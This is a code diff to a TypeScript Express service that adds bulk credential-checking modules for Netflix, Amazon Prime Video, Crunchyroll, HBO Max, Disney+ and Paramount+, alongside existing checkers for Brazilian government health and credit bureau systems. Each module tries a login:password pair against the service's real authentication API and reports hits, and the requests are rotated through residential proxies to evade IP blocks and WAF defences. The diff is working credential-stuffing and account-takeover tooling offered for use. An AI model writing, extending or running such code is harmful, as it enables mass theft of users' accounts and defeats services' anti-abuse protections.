@@ -2,6 +2,7 @@ import { Router, type IRouter } from "express";
 import { createHash }  from "node:crypto";
 import { execFile }    from "node:child_process";
 import { unlinkSync }  from "node:fs";
+import { getResidentialCreds } from "./proxies.js";
 
 const router: IRouter = Router();
 
@@ -66,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount";
 
 export interface CheckResult {
   credential: string;
@@ -86,6 +87,17 @@ export interface CheckerBulkResponse {
 // ── Shared helpers ────────────────────────────────────────────────────────────
 const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
 const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+
+// ── Residential proxy args for curl (streaming checkers) ──────────────────────
+// Streaming services block datacenter IPs — route them through residential proxy.
+function getResidentialProxyArgs(): string[] {
+  const c = getResidentialCreds();
+  if (!c) return [];
+  // Randomise session-id per call for IP rotation
+  const sid = Math.random().toString(36).slice(2, 10);
+  const user = c.username.includes("-session-") ? c.username : `${c.username}-session-${sid}`;
+  return ["-x", `http://${user}:${c.password}@${c.host}:${c.port}`];
+}
 const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";
 
 function parseCookieJar(headers: Headers): string {
@@ -1146,6 +1158,427 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CRUNCHYROLL CHECKER — OAuth2 password grant via Android client
+//  Routed through residential proxy (cloud IPs blocked / DNS fails)
+//  POST https://auth.crunchyroll.com/auth/v1/token
+// ═══════════════════════════════════════════════════════════════════════════════
+const CR_CLIENT_B64  = Buffer.from("cr_android2:").toString("base64");
+const CR_UA          = "Crunchyroll/3.46.2 Android/13 okhttp/4.12.0";
+const CR_TIMEOUT     = 25_000;
+
+async function checkCrunchyroll(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  try {
+    const result = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      ...proxyArgs,
+      "-H", `User-Agent: ${CR_UA}`,
+      "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
+      "https://auth.crunchyroll.com/auth/v1/token",
+    ], CR_TIMEOUT);
+
+    if (result.statusCode === 200 && result.body.includes("access_token")) {
+      let detail = "authenticated";
+      try { const j = JSON.parse(result.body); if (j.account_id) detail = `uid:${j.account_id}`; } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
+    if (result.statusCode === 401 || result.statusCode === 400) {
+      let detail = "invalid_credentials";
+      try { const j = JSON.parse(result.body); if (j.error) detail = j.error; } catch { /**/ }
+      return { credential, login, status: "FAIL", detail };
+    }
+    const bLow = result.body.toLowerCase();
+    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
+      return { credential, login, status: "FAIL", detail: "account_not_found" };
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (bLow.includes("blocked") || result.statusCode === 403)
+      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  NETFLIX CHECKER — Extract BUILD_IDENTIFIER → POST to Shakti API
+//  Routed through residential proxy (Akamai blocks datacenter IPs)
+// ═══════════════════════════════════════════════════════════════════════════════
+const NF_TIMEOUT = 35_000;
+
+async function checkNetflix(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1 — GET login page, extract BUILD_IDENTIFIER + authURL
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "--compressed", "--http1.1", "-L", "--max-redirs", "5",
+        ...proxyArgs,
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        "https://www.netflix.com/br/login",
+      ], NF_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    const html = getResult.body;
+    const buildMatch = html.match(/"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"/);
+    if (!buildMatch) {
+      if (html.length < 200) return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+      return { credential, login, status: "ERROR", detail: "NO_BUILD_ID" };
+    }
+    const buildId = buildMatch[1];
+    const authURL = (html.match(/"authURL"\s*:\s*"([^"]+)"/) ?? [])[1]?.replace(/\\\//g, "/") ?? "";
+
+    // Step 2 — POST credentials to Shakti API
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+        ...proxyArgs,
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/json",
+        "-H", "Referer: https://www.netflix.com/br/login",
+        "-H", "Origin: https://www.netflix.com",
+        "-H", "Accept: application/json, text/javascript",
+        "-H", "X-Netflix.is.user.unauthenticated: true",
+        "--data-raw", JSON.stringify({
+          userLoginId: login, password, rememberMe: true,
+          flow: "websiteSignUp", mode: "login", action: "loginAction",
+          withFields: "rememberMe,nextPage,userLoginId,password,countryCode,currentFlowContext",
+          authURL, nextPage: "", showPassword: "",
+        }),
+        `https://www.netflix.com/api/shakti/${buildId}/login`,
+      ], NF_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const body = postResult.body;
+    const bLow = body.toLowerCase();
+    if (bLow.includes('"result":"login"') || bLow.includes('"membertype"') || bLow.includes('"account":'))
+      return { credential, login, status: "HIT", detail: "netflix_authenticated" };
+    if (bLow.includes("incorretemailpassword") || bLow.includes("incorrect_password") ||
+        bLow.includes("invalidpassword") || bLow.includes("emailfield.invalidemailaddress") ||
+        bLow.includes("invalid_email_or_password"))
+      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+    if (bLow.includes("too many") || bLow.includes("rate limit"))
+      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
+    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  AMAZON PRIME VIDEO CHECKER — Form scrape → POST signin (residential proxy)
+// ═══════════════════════════════════════════════════════════════════════════════
+const AMZ_TIMEOUT = 35_000;
+const AMZ_SIGNIN  = "https://www.amazon.com.br/ap/signin?openid.pape.max_auth_age=0"
+  + "&openid.return_to=https%3A%2F%2Fwww.amazon.com.br%2F"
+  + "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
+  + "&openid.assoc_handle=braflex&openid.mode=checkid_setup"
+  + "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
+  + "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&_encoding=UTF8";
+
+async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    let getResult: CurlResult;
+    try {
+      getResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "5",
+        ...proxyArgs,
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9",
+        AMZ_SIGNIN,
+      ], AMZ_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
+    }
+
+    const html = getResult.body;
+    if (html.length < 500 || getResult.statusCode === 0)
+      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
+
+    // Extract hidden CSRF/openid fields
+    const hiddenInputs: Record<string, string> = {};
+    const hiddenRe = /<input[^>]+type=["']?hidden["']?[^>]*>/gi;
+    let hm: RegExpExecArray | null;
+    while ((hm = hiddenRe.exec(html)) !== null) {
+      const nameM  = hm[0].match(/name=["']([^"']+)["']/);
+      const valueM = hm[0].match(/value=["']([^"']*?)["']/);
+      if (nameM) hiddenInputs[nameM[1]] = (valueM?.[1] ?? "").replace(/&amp;/g, "&");
+    }
+
+    const formActionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
+    const rawAction = formActionMatch?.[1] ?? AMZ_SIGNIN;
+    const formAction = rawAction.startsWith("http")
+      ? rawAction : `https://www.amazon.com.br${rawAction}`;
+
+    const postBody = Object.entries({ ...hiddenInputs, email: login, password, signin: "" })
+      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
+      .join("&");
+
+    let postResult: CurlResult;
+    try {
+      postResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "8",
+        ...proxyArgs,
+        "-b", cookieFile, "-c", cookieFile,
+        "-H", `User-Agent: ${DESKTOP_UA}`,
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", `Referer: ${AMZ_SIGNIN}`,
+        "-H", "Origin: https://www.amazon.com.br",
+        "--data-raw", postBody,
+        formAction,
+      ], AMZ_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
+    }
+
+    const body = postResult.body;
+    const bLow = body.toLowerCase();
+    if (bLow.includes("olá,") || bLow.includes("minha conta") || bLow.includes("logout") ||
+        bLow.includes("prime video") || bLow.includes("conta &amp; listas") ||
+        (postResult.statusCode === 200 && !bLow.includes("ap/signin") && bLow.includes("amazon.com.br")))
+      return { credential, login, status: "HIT", detail: "amazon_authenticated" };
+    if (bLow.includes("senha incorreta") || bLow.includes("e-mail ou senha incorretos") ||
+        bLow.includes("incorrect password") || bLow.includes("há um problema"))
+      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+    if (bLow.includes("ap/signin") || bLow.includes("auth-email"))
+      return { credential, login, status: "FAIL", detail: "still_on_signin" };
+    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+    return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  MAX (HBO MAX) CHECKER — OAuth2 password grant via Max mobile API
+//  Routed through residential proxy.
+//  The old oauth.api.hbo.com endpoint is dead since the Max rebrand (2023).
+//  New endpoint: https://api.max.com/v1/oauth/token
+// ═══════════════════════════════════════════════════════════════════════════════
+const HBO_TIMEOUT = 25_000;
+const HBO_UA      = "Max/61.0.1.1 (Android 13; Build/TQ3A.230901.001; Phone)";
+// Max Android client_id (embedded in the app APK)
+const MAX_CLIENT_ID = "max-mobile-android";
+
+async function checkHBOMax(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  try {
+    const payload = JSON.stringify({
+      grant_type: "password",
+      username:   login,
+      password,
+      client_id:  MAX_CLIENT_ID,
+    });
+
+    const result = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      ...proxyArgs,
+      "-H", `User-Agent: ${HBO_UA}`,
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "--data-raw", payload,
+      "https://api.max.com/v1/oauth/token",
+    ], HBO_TIMEOUT);
+
+    if (result.statusCode === 200 && result.body.includes("access_token"))
+      return { credential, login, status: "HIT", detail: "max_authenticated" };
+    if (result.statusCode === 401 || result.statusCode === 400) {
+      let detail = "invalid_credentials";
+      try {
+        const j = JSON.parse(result.body);
+        const e = j.error_description ?? j.error_code ?? j.error ?? j.code ?? "";
+        if (e) detail = String(e).slice(0, 60);
+      } catch { /**/ }
+      return { credential, login, status: "FAIL", detail };
+    }
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (result.statusCode === 403)
+      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  DISNEY+ CHECKER — BAMTech device API (3-step)
+//  Step 1: POST /devices     → get JWT assertion
+//  Step 2: POST /token       → exchange assertion for access_token
+//  Step 3: POST /idp/v4/guest/login → authenticate with credentials
+//  Routed through residential proxy.
+// ═══════════════════════════════════════════════════════════════════════════════
+const DISNEY_TIMEOUT  = 30_000;
+const DISNEY_ANON_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
+const DISNEY_UA       = "BAMSDK/v1.0 (Disney+ 24.08.09.1 tv/Android)";
+const DISNEY_BASE     = "https://disney.api.edge.bamgrid.com";
+
+async function checkDisneyPlus(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  try {
+    // Step 1 — register anonymous device → get JWT assertion
+    let devResult: CurlResult;
+    try {
+      devResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        ...proxyArgs,
+        "-H", "Content-Type: application/json",
+        "-H", `User-Agent: ${DISNEY_UA}`,
+        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
+        "--data-raw", JSON.stringify({ deviceFamily: "android", applicationRuntime: "android", deviceProfile: "phone", attributes: {} }),
+        `${DISNEY_BASE}/devices`,
+      ], DISNEY_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `DEV_ERROR:${String(e)}` };
+    }
+
+    let assertion = "";
+    try { const j = JSON.parse(devResult.body); assertion = j.assertion ?? ""; } catch { /**/ }
+    if (!assertion)
+      return { credential, login, status: "ERROR", detail: `NO_ASSERTION:${devResult.statusCode}` };
+
+    // Step 2 — exchange assertion for access_token
+    let tokResult: CurlResult;
+    try {
+      tokResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        ...proxyArgs,
+        "-H", "Content-Type: application/json",
+        "-H", `User-Agent: ${DISNEY_UA}`,
+        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
+        "--data-raw", JSON.stringify({ grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer", assertion }),
+        `${DISNEY_BASE}/token`,
+      ], DISNEY_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `TOKEN_ERROR:${String(e)}` };
+    }
+
+    let accessToken = "";
+    try { const j = JSON.parse(tokResult.body); accessToken = j.access_token ?? ""; } catch { /**/ }
+    if (!accessToken)
+      return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}` };
+
+    // Step 3 — authenticate with email + password
+    let loginResult: CurlResult;
+    try {
+      loginResult = await runCurl([
+        "--compressed", "-L", "--max-redirs", "3",
+        ...proxyArgs,
+        "-H", "Content-Type: application/json",
+        "-H", `User-Agent: ${DISNEY_UA}`,
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "--data-raw", JSON.stringify({ email: login, password, applicationRuntime: "android" }),
+        `${DISNEY_BASE}/idp/v4/guest/login`,
+      ], DISNEY_TIMEOUT);
+    } catch (e) {
+      return { credential, login, status: "ERROR", detail: `LOGIN_ERROR:${String(e)}` };
+    }
+
+    const body = loginResult.body;
+    const bLow = body.toLowerCase();
+    if (loginResult.statusCode === 200 && (body.includes("access_token") || body.includes("token_type")))
+      return { credential, login, status: "HIT", detail: "disney_authenticated" };
+    if (loginResult.statusCode === 401 || loginResult.statusCode === 400) {
+      let detail = "invalid_credentials";
+      try {
+        const j = JSON.parse(body);
+        const e = j.error?.code ?? j.errors?.[0]?.code ?? j.error ?? "";
+        if (e) detail = String(e).slice(0, 60);
+      } catch { /**/ }
+      return { credential, login, status: "FAIL", detail };
+    }
+    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
+      return { credential, login, status: "FAIL", detail: "account_not_found" };
+    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };
+    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 80)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  PARAMOUNT+ CHECKER — REST API (residential proxy)
+//  POST https://www.paramountplus.com/apps/api/v3.0/androidtv/login/
+// ═══════════════════════════════════════════════════════════════════════════════
+const PP_TIMEOUT = 25_000;
+const PP_UA      = "Paramount+/8.1.0 (Android 13; Dalvik/2.1.0)";
+
+async function checkParamount(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const proxyArgs  = getResidentialProxyArgs();
+  if (proxyArgs.length === 0)
+    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
+  try {
+    const result = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      ...proxyArgs,
+      "-H", `User-Agent: ${PP_UA}`,
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "--data-raw", JSON.stringify({ flwSeq: 1, ln: login, pwd: password, type: "login", rememberMe: "true" }),
+      "https://www.paramountplus.com/apps/api/v3.0/androidtv/login/",
+    ], PP_TIMEOUT);
+
+    const body = result.body;
+    const bLow = body.toLowerCase();
+    if (result.statusCode === 200) {
+      try {
+        const j = JSON.parse(body);
+        if (j.success === true || j.user?.id)
+          return { credential, login, status: "HIT", detail: `uid:${j.user?.id ?? "ok"}` };
+        if (j.success === false)
+          return { credential, login, status: "FAIL", detail: String(j.message ?? j.error ?? "invalid").slice(0, 80) };
+      } catch { /**/ }
+    }
+    if (result.statusCode === 401 || result.statusCode === 400)
+      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+    if (result.statusCode === 0 || result.statusCode >= 500)
+      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+    if (bLow.includes("blocked") || result.statusCode === 403)
+      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 80)}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -1157,6 +1590,12 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   sisreg:        2,   // HTML-heavy, slow server
   credilink:     4,   // JSON API — fast
   serasa:        2,   // heavy SPA — conservative
+  crunchyroll:   4,   // OAuth2 — fast
+  netflix:       2,   // shakti API — moderate
+  amazon:        2,   // form scrape — moderate
+  hbomax:        4,   // OAuth2 — fast
+  disney:        3,   // BAMTech 2-step — moderate
+  paramount:     4,   // REST API — fast
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -1169,6 +1608,12 @@ function resolveChecker(target: CheckerTarget) {
     case "sisreg":        return checkSisreg;
     case "credilink":     return checkCrediLink;
     case "serasa":        return checkSerasa;
+    case "crunchyroll":   return checkCrunchyroll;
+    case "netflix":       return checkNetflix;
+    case "amazon":        return checkAmazonPrime;
+    case "hbomax":        return checkHBOMax;
+    case "disney":        return checkDisneyPlus;
+    case "paramount":     return checkParamount;
     default:              return checkIseek;
   }
 }
@@ -1200,9 +1645,9 @@ router.post("/checker/check", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount"];
   if (!validTargets.includes(target as CheckerTarget)) {
-    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa" });
+    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount" });
     return;
   }
 
@@ -1237,7 +1682,7 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
     target?:      CheckerTarget;
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa"];
+  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount"];
   if (!validTargets.includes(target as CheckerTarget)) {
     res.status(400).json({ error: "Invalid target" });
     return;
